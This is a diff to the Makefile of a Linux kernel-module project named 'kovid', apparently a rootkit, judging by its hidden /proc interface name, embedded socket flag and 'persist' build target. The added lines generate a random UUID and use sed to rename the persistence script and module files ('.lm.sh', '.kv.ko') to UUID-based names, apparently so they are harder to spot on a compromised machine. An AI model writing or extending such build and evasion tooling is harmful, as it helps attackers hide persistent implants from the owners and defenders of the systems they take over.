@@ -9,9 +9,12 @@ endif
 LD=$(shell which ld)
 AS=$(shell which as)
 CTAGS=$(shell which ctags))
+UUIDGEN := $(shell uuidgen)
+
 # PROCNAME, /proc/<name> interface. You must change it.
 COMPILER_OPTIONS := -Wall -DPROCNAME='"changeme"' \
-	-DMODNAME='"kovid"' -DKSOCKET_EMBEDDED ${DEBUG_PR} -DCPUHACK -DPRCTIMEOUT=1200
+	-DMODNAME='"kovid"' -DKSOCKET_EMBEDDED ${DEBUG_PR} -DCPUHACK -DPRCTIMEOUT=1200 \
+	-DUUIDGEN=\"$(UUIDGEN)\"
 
 EXTRA_CFLAGS := -I$(src)/src -I$(src)/fs ${COMPILER_OPTIONS}
 
@@ -30,6 +33,8 @@ all: persist
 	make  -C  /lib/modules/$(shell uname -r)/build M=$(PWD) modules
 
 persist:
+	sed -i "s|.lm.sh|${UUIDGEN}.sh|g" $(persist).S
+	sed -i "s|.kv.ko|${UUIDGEN}.ko|g" $(persist).S
 	$(AS) --64 $(persist).S -statistics -fatal-warnings \
 		-size-check=error -o $(persist).o
 	$(LD) -Ttext 200000 --oformat binary -o $(persist) $(persist).o
